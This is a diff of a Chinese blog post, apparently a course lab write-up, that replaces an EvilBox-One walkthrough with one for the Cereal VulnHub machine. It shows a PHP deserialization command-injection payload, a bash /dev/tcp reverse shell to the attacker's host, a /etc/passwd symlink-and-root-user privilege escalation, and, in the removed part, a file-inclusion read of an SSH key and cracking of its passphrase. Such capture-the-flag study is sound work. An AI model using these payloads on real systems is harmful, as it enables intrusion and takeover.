-<p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
+<p>网络攻防实战 第十次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#107;&#101;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#107;&#101;&#101;&#107;&#107;&#101;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>2022年11月26日</p>
+<p>靶机链接：<a href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p>
 </blockquote>
-<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p>
-<p>我们将使用到以下攻击手段：</p>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机 root 权限和一个 root flag。</p>
+<p>我们将使用以下攻击手段：</p>
 <ul>
-<li>主机发现、端口扫描</li>
-<li>隐藏路径爆破</li>
-<li>参数名爆破</li>
-<li>文件包含漏洞的发现以及利用</li>
-<li>SSH 登入</li>
-<li>私钥密码爆破</li>
-<li>特定权限文件的发现</li>
-<li>添加自定义用户记录</li>
+<li>主机发现、端口扫描；</li>
+<li>隐藏路径爆破；</li>
+<li>域名绑定 IP；</li>
+<li>隐藏域名爆破；</li>
+<li>隐藏文件爆破；</li>
+<li>解析 PHP 对象序列并进行命令注入；</li>
+<li>反弹 shell；</li>
+<li>利用 pspy 工具查看靶机上运行的所有进程；</li>
+<li>通过链接文件利用靶机漏洞；</li>
+<li>自定义 root 用户；</li>
 </ul>
 <h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
 <p>kali: 10.0.2.15</p>
-<p>靶机: 10.0.2.12</p>
+<p>靶机: 10.0.2.17</p>
 </blockquote>
 <h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
 <li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br></pre></td></tr></table></figure>
 
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" alt="image-20221108211601033" />  
+<img src="https://assets.kekwy.com/images/image-20221124223623886.png" alt="image-20221124223623886" style="zoom:150%;" />
+
+<p>发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。</p>
 </li>
-<li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" alt="image-20221108211801201"  /></li>
+<li><p>访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息：</p>
+<img src="https://assets.kekwy.com/images/image-20221124224018467.png" alt="image-20221124224018467" style="zoom:150%;" />
+</li>
+<li><p>尝试进行隐藏路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17</span><br></pre></td></tr></table></figure>
+
+<img src="https://assets.kekwy.com/images/image-20221124224804390.png" alt="image-20221124224804390" style="zoom:150%;" />
+</li>
+<li><p>访问 <a href="http://10.0.2.17/blog%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E6%A0%B7%E5%BC%8F%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%96%91%E4%BC%BC%E4%B8%8E%E6%9F%90%E4%B8%80%E5%9F%9F%E5%90%8D%E6%9C%89%E5%85%B3%EF%BC%9A">http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关：</a></p>
+<img src="https://assets.kekwy.com/images/image-20221124225803901.png" alt="image-20221124225803901" style="zoom:150%;" />
+
+<p>同时发现该网页是由 WordPress 支持的。</p>
+<ul>
+<li>技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。</li>
+</ul>
+</li>
+<li><p>对 &#x2F;blog 路径进行进一步的路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17/blog/</span><br></pre></td></tr></table></figure>
+
+<img src="https://assets.kekwy.com/images/image-20221124230403083.png" alt="image-20221124230403083" style="zoom:150%;" />
+
+<p>发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。</p>
+</li>
+<li><p>尝试在 hosts 文件中加入记录 <code>10.0.2.17 cereal.ctf</code> 将该域名与靶机的 IP 地址对应。</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/etc/hosts:</span><br><span class="line">...</span><br><span class="line">10.0.2.17 		cereal.ctf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重新访问 blog 页面，发现成功加载了样式：</p>
+<img src="https://assets.kekwy.com/images/image-20221124231004932.png" alt="image-20221124231004932" style="zoom:150%;" />
+</li>
+<li><p>在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。</p>
+</li>
+<li><p>尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口：</p>
+<img src="https://assets.kekwy.com/images/image-20221125121314821.png" alt="image-20221125121314821" style="zoom:150%;" />
+
+<p>直接访问发现只有一行文本内容。</p>
+</li>
 </ol>
-<h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol>
-<li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" alt="image-20221108212228720" /> 
+<h3 id="0x01-服务器域名爆破"><a href="#0x01-服务器域名爆破" class="headerlink" title="0x01. 服务器域名爆破"></a>0x01. 服务器域名爆破</h3><ol>
+<li><p>联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt</span><br></pre></td></tr></table></figure>
 
-<p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p>
-<p>分别访问均没有获得有效信息。</p>
-<p>ps：<a href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p>
+<ul>
+<li>字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt</li>
+</ul>
+<img src="https://assets.kekwy.com/images/image-20221125154012372.png" alt="image-20221125154012372" style="zoom:150%;" />
+
+<p>成功扫描出一个域名：<code>secure.cereal.ctf</code></p>
 </li>
-<li><p>对 <code>/secret/</code> 做进一步路径爆破：</p>
-<p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p>
-<blockquote>
-<p>安装：apt install gobuster</p>
-<p>安装字典：apt install seclists</p>
-<p>渗透测试要尝试掌握多种工具</p>
-</blockquote>
-<p>使用指定字典进行路径爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure>
+<li><p>将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 <code>http://secure.cereal.ctf:44441/</code>：</p>
+<img src="https://assets.kekwy.com/images/image-20221125154405285.png" alt="image-20221125154405285" style="zoom:150%;" />
+</li>
+<li><p>发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162041920.png" alt="image-20221125162041920" style="zoom:150%;" />
 
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" alt="image-20221108213853527" />  
-
-<p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p>
+<p>发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。</p>
 </li>
 </ol>
-<h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p>
+<h3 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02. 命令注入"></a>0x02. 命令注入</h3><ol>
+<li><p>尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162519586.png" alt="image-20221125162519586" style="zoom:150%;" />
+
+<p>发现请求体比较可疑。</p>
+</li>
+<li><p>在 burp suite 中选中请求体中 obj 字段的值，进行解码：</p>
+<img src="https://assets.kekwy.com/images/image-20221125162824732.png" alt="image-20221125162824732" style="zoom:150%;" />
+
+
+
+
+
+<img src="https://assets.kekwy.com/images/image-20221125162901663.png" alt="image-20221125162901663" style="zoom:150%;" />
+
+<p>得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。</p>
+</li>
+<li><p>查看相关的网页源码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">submit_form</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> object = <span class="title function_">serialize</span>(&#123;<span class="attr">ipAddress</span>: <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">ip</span>.<span class="property">value</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">		object = object.<span class="title function_">substr</span>(object.<span class="title function_">indexOf</span>(<span class="string">&quot;&#123;&quot;</span>),object.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">		object = <span class="string">&quot;O:8:\&quot;pingTest\&quot;:1:&quot;</span> + object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">obj</span>.<span class="property">value</span> = object;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ipform&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。</p>
+<ul>
+<li><p>“We are in the process of restoring from our backups”</p>
+<img src="https://assets.kekwy.com/images/image-20221125171732769.png" alt="image-20221125171732769" style="zoom:150%;" /></li>
+</ul>
+</li>
+</ol>
+<h3 id="0x03-隐藏文件爆破"><a href="#0x03-隐藏文件爆破" class="headerlink" title="0x03. 隐藏文件爆破"></a>0x03. 隐藏文件爆破</h3><ol>
+<li><p>使用 kali 自带的 <code>DirBuster</code> 工具进行爆破：</p>
+<img src="https://assets.kekwy.com/images/image-20221125165830104.png" alt="image-20221125165830104" style="zoom:150%;" />
+
+<p>最终发现路径：<code>/back_en</code></p>
+</li>
+<li><p>继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 <code>.bak</code>：</p>
+<img src="https://assets.kekwy.com/images/image-20221126113550850.png" alt="image-20221126113550850" style="zoom:150%;" />
+
+<img src="https://assets.kekwy.com/images/image-20221126113421704.png" alt="image-20221126113421704" style="zoom:150%;" />
+
+<p>发现备份文件 <code>index.php.bak</code>。</p>
+</li>
+<li><p>将查找到的备份文件下载到 kali：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://secure.cereal.ctf:44441/back_en/index.php.bak</span><br></pre></td></tr></table></figure>
+
+<p>查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = False;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果当前对象中的 isValid 值不为 True</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 进行了某种过滤</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">                <span class="comment">// 测试通过才会执行代码</span></span><br><span class="line">				<span class="variable language_">$this</span>-&gt;isValid = True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ping</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 指令的执行方式</span></span><br><span class="line">			<span class="variable language_">$this</span>-&gt;output = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pingTest</span>-&gt;<span class="title function_ invoke__">validate</span>();</span><br></pre></td></tr></table></figure>
+
+<p>通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 <code>isValid</code> 值本身为 True，就可以绕过服务端对 <code>ipAddress</code> 字段合法性的检测，最终导致靶机执行我们所注入的命令。</p>
+</li>
+</ol>
+<h3 id="0x04-继续命令注入"><a href="#0x04-继续命令注入" class="headerlink" title="0x04. 继续命令注入"></a>0x04. 继续命令注入</h3><p><a id="task1"></a></p>
 <ol>
-<li><p>首先期望存在命令注入漏洞：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure>
+<li><p>简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析：</p>
+<p><code>O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125;</code></p>
+<ul>
+<li>o：object，表示对象类型；</li>
+<li>8：表示其后的字符串长度为8；</li>
+<li>“pingTest”：表示当前对象为类 <code>pingTest</code> 的一个对象；</li>
+<li>1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性；</li>
+<li>s：string，表示字符串类型；</li>
+<li>9：其后的字符串长度；</li>
+<li>“ipAddress”：属性的名称；</li>
+<li>“127.0.0.1”：”ipAddress”属性的值；</li>
+</ul>
+<p>参考：<a href="https://blog.csdn.net/qq_31088019/article/details/126519989">PHP序列化和反序列化</a></p>
+</li>
+<li><p>可见请求体中发送给服务器的对象仅包含了 <code>ipAddress</code> 这个一个属性，为了绕过服务端的检测，需要添加 <code>isValid</code> 属性且将其赋值为 True。构造对象序列如下：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+<ul>
+<li>加入属性 <code>s:7:&quot;isValid&quot;;b:1;</code> 。</li>
+</ul>
+<p>其中，分析服务端代码得知，我们可以将需要注入的命令包含在 <code>ipAddress</code> 的值中，最终修改序列如下：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+</li>
+<li><p>在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送：</p>
+<img src="https://assets.kekwy.com/images/image-20221125211946453.png" alt="image-20221125211946453" style="zoom:150%;" />
+</li>
+<li><p>发现除了 ping 的结果，我们还收到了注入命令的执行结果：</p>
+<img src="https://assets.kekwy.com/images/image-20221125212053362.png" alt="image-20221125212053362" style="zoom:150%;" />
+</li>
+<li><p>尝试使用如下命令获取反弹 shell：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>构造注入序列：</p>
+<p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p>
+<p>在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell：</p>
+<img src="https://assets.kekwy.com/images/image-20221125222124067.png" alt="image-20221125222124067" style="zoom:150%;" /></li>
+</ol>
+<h3 id="0x05-本地漏洞提权"><a href="#0x05-本地漏洞提权" class="headerlink" title="0x05. 本地漏洞提权"></a>0x05. 本地漏洞提权</h3><p><a id="task2"></a></p>
+<ol>
+<li><p>利用 <code>pspy</code> 工具检测靶机上正在运行的进程：</p>
+<img src="https://assets.kekwy.com/images/image-20221126105419392.png" alt="image-20221126105419392" style="zoom:150%;" />
+
+<p>发现存在一个以 root 身份运行某个 shell 脚本的进程。</p>
+<ul>
+<li>pspy 工具：<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li>
+</ul>
+</li>
+<li><p>查看该脚本内容;</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure>
+
+<p>发现是将 <code>/home/rocky/public_html/*</code> 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对  passwd 文件的写入权限。</p>
+</li>
+<li><p>使用 ln 命令将 passwd 文件链接到该目录下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd /home/rocky/public_html/111111</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>等待片刻后查看 passwd 文件的权限：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>-rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd</code></p>
+<p>发现文件权限成功被修改。</p>
+</li>
+<li><p>再次使用 <a href="https://blog.kekwy.com/vulnhub-evilboxone/#0x05-%E8%87%AA%E5%AE%9A%E4%B9%89-root-%E7%94%A8%E6%88%B7">实验八</a> 中自定义 root 用户的方式，插入一条 root 权限的用户记录：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>切换至该自定义用户，成功提权：</p>
+<img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" /></li>
+</ol>
+<h3 id="0x06-最终的信息收集"><a href="#0x06-最终的信息收集" class="headerlink" title="0x06. 最终的信息收集"></a>0x06. 最终的信息收集</h3><ol>
+<li><p>尝试使用 ssh 以自定义 root 用户身份登入靶机：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh test123@10.0.2.17</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功登入后查看当前目录下的文件：</p>
+<img src="https://assets.kekwy.com/images/image-20221126150151952.png" alt="image-20221126150151952" style="zoom:150%;" />
+</li>
+<li><p>查看文件 <code>proof.txt</code> 得到 flag：<code>1aeb5db4e979543cb807cfd90df77763</code></p>
+<img src="https://assets.kekwy.com/images/image-20221126150320630.png" alt="image-20221126150320630" style="zoom:150%;" />
+</li>
+<li><p>查看文件 <code>listener.sh</code>：<br><a id="task3"></a></p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">nc -k -l 139 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 445 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 11111 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22222 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22223 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33333 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33334 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 44444 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55555 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55551</span><br></pre></td></tr></table></figure>
+
+<p>发现是一段 shell 脚本，通过 nc 命令监听了很多端口。</p>
+<p>推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。</p>
+</li>
+</ol>
+<h2 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h2><p><strong>root 权限：</strong></p>
+<img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" />
 
 <ul>
-<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
-<li>命令 <code>ls</code> 作为参数值。</li>
-</ul>
-<p>进行爆破后，为获得有效结果，爆破失败。</p>
-</li>
-<li><p>期望存在文件包含漏洞：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
-<li>已知存在的主页文件的路径作为参数值。</li>
-</ul>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" alt="image-20221108225352732" /> 
-
-<p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p>
-</li>
-<li><p>查看靶机文件验证漏洞存在：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>查看返回页面源码：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" alt="image-20221108225808433" width=300% /> 
-
-<p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p>
-</li>
-</ol>
-<h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol>
-<li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" alt="image-20221109091744345" width=300% />
-
-<p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p>
-</li>
-<li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" alt="image-20221109092317615" width=300% /> 
-
-<p>将其保存在文件 <code>id_rsa</code> 中。 </p>
-</li>
-<li><p>使用指定私钥登录靶机：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure>
-
-<p>发现需要输入私钥的密码：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" alt="image-20221109093513763" /> 
-
-<p>考虑对其进行爆破。  </p>
-<p>如果出现报错：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" alt="image-20221109093055156" /> 
-
-<p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p>
-<p>修改权限为7000即可：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p>
-</li>
-<li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用 <code>john</code> 进行爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p>
-</blockquote>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" alt="image-20221109094836969" /> 
-
-<p>成功获取私钥密码 <code>unicorn</code>。</p>
-</li>
-<li><p>成功登入靶机：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" alt="image-20221109095933335" /></li>
-</ol>
-<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol>
-<li><p>查看当前目录下的文件，获取第一个 Flag：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" alt="image-20221109100516303" /> 
-
-<p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
-</li>
-<li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>find指令的使用：<a href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p>
